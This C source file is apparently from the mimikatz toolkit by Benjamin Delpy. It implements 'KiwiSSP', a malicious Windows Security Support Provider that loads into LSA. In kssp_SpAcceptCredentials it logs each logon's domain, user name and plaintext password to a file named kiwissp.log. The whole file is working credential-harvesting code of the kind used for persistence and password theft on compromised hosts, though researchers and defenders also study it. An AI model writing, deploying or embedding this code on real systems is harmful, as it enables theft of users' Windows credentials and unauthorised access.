/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kssp.h"

static SECPKG_FUNCTION_TABLE kiwissp_SecPkgFunctionTable[] = {
	{
	NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
	kssp_SpInitialize, kssp_SpShutDown, kssp_SpGetInfo, kssp_SpAcceptCredentials,
	NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
	NULL, NULL, NULL, NULL, NULL, NULL, NULL
	}
};

NTSTATUS NTAPI kssp_SpInitialize(ULONG_PTR PackageId, PSECPKG_PARAMETERS Parameters, PLSA_SECPKG_FUNCTION_TABLE FunctionTable)
{
	return STATUS_SUCCESS;
}

NTSTATUS NTAPI kssp_SpShutDown(void)
{
	return STATUS_SUCCESS;
}

NTSTATUS NTAPI kssp_SpGetInfo(PSecPkgInfoW PackageInfo)
{
	PackageInfo->fCapabilities = SECPKG_FLAG_ACCEPT_WIN32_NAME | SECPKG_FLAG_CONNECTION;
	PackageInfo->wVersion   = 1;
	PackageInfo->wRPCID     = SECPKG_ID_NONE;
	PackageInfo->cbMaxToken = 0;
	PackageInfo->Name       = L"KiwiSSP";
	PackageInfo->Comment    = L"Kiwi Security Support Provider";
	return STATUS_SUCCESS;
}

NTSTATUS NTAPI kssp_SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)
{
	FILE *kssp_logfile;
#pragma warning(push)
#pragma warning(disable:4996)
	if(kssp_logfile = _wfopen(L"kiwissp.log", L"a"))
#pragma warning(pop)
	{	
		klog(kssp_logfile, L"[%08x:%08x] [%08x] %wZ\\%wZ (%wZ)\t", PrimaryCredentials->LogonId.HighPart, PrimaryCredentials->LogonId.LowPart, LogonType, &PrimaryCredentials->DomainName, &PrimaryCredentials->DownlevelName, AccountName);
		klog_password(kssp_logfile, &PrimaryCredentials->Password);
		klog(kssp_logfile, L"\n");
		fclose(kssp_logfile);
	}
	return STATUS_SUCCESS;
}

NTSTATUS NTAPI kssp_SpLsaModeInitialize(ULONG LsaVersion, PULONG PackageVersion, PSECPKG_FUNCTION_TABLE *ppTables, PULONG pcTables)
{
	*PackageVersion = SECPKG_INTERFACE_VERSION;
	*ppTables = kiwissp_SecPkgFunctionTable;
	*pcTables = ARRAYSIZE(kiwissp_SecPkgFunctionTable);
	return STATUS_SUCCESS;
}